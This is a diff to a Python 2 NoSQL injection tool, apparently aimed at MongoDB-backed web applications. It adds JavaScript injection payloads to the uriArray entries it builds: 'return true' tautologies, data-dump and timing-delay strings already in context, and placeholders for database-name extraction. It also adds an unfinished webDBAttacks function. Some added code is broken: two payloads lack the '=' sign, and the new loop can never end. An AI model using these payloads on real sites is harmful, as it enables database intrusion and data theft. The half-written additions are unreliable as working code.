@@ -407,6 +407,8 @@ def webApps():
 	appUp = False
 	strTbAttack = False
 	intTbAttack = False
+	trueStr = False
+	trueInt = False
 	
 	#Verify app is working.  
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
@@ -695,6 +697,17 @@ def webApps():
 	raw_input("Press enter to continue...")
 	return()
 
+def webDBAttacks(trueLen):
+	nameLen = 0
+	injTestLen = 0
+	getDBName = raw_input("Get database name? ")
+	
+	if getDBName == "y" or getDBName == "Y":
+		while injTestLen != trueLen:
+			testUri = uriArray[16].split("---")
+			
+	
+
 def randInjString(size):
 	print "What format should the random string take?"
 	print "1-Alphanumeric"
@@ -731,7 +744,7 @@ def buildUri(origUri, randValue):
 	paramName = []
 	paramValue = []
 	global uriArray
-	uriArray = ["","","","","","","","","","","","","",""]
+	uriArray = ["","","","","","","","","","","","","","","","",""]
 	injOpt = ""
 	
 	#Split the string between the path and parameters, and then split each parameter
@@ -764,8 +777,6 @@ def buildUri(origUri, randValue):
 		raw_input("Something went wrong.  Press enter to return to the main menu...")
 		mainMenu()
 	
-	#print "debug:"
-	#print split_uri[0]
 	
 	x = 0
 	uriArray[0] = split_uri[0] + "?"
@@ -782,6 +793,10 @@ def buildUri(origUri, randValue):
 	uriArray[11] = split_uri[0] + "?"
 	uriArray[12] = split_uri[0] + "?"
 	uriArray[13] = split_uri[0] + "?"
+	uriArray[14] = split_uri[0] + "?"
+	uriArray[15] = split_uri[0] + "?"
+	uriArray[16] = split_uri[0] + "?"
+	uriArray[17] = split_uri[0] + "?"
 	
 	for item in paramName:		
 		if paramName[x] == injOpt:
@@ -799,7 +814,11 @@ def buildUri(origUri, randValue):
 			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy=\"!" + "&"
 			uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
 			uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
-			
+			uriArray[14] += paramName[x] + "a'; return true; var dum=a'"
+			uriArray[15] += paramName[x] + "1; return true; var dum=2"
+			#Add values that can be manipulated for database attacks
+			uriArray[16] += paramName[x] + "=a'; if ---"
+			uriArray[17] += paramName[x] + "=1; if ---"
 
 		else:
 			uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
@@ -816,7 +835,10 @@ def buildUri(origUri, randValue):
 			uriArray[11] += paramName[x] + "=" + paramValue[x] + "&"
 			uriArray[12] += paramName[x] + "=" + paramValue[x] + "&"
 			uriArray[13] += paramName[x] + "=" + paramValue[x] + "&"
-			
+			uriArray[14] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[15] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[16] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[17] += paramName[x] + "=" + paramValue[x] + "&"
 		x += 1
 		
 	#Clip the extra & off the end of the URL
@@ -834,6 +856,10 @@ def buildUri(origUri, randValue):
 	uriArray[11] = uriArray[11][:-1]
 	uriArray[12] = uriArray[12][:-1]
 	uriArray[13] = uriArray[13][:-1]
+	uriArray[14] = uriArray[14][:-1]
+	uriArray[15] = uriArray[15][:-1]
+	uriArray[16] = uriArray[16][:-1]
+	uriArray[17] = uriArray[17][:-1]
 	return uriArray[0]
 
 def stealDBs(myDB):
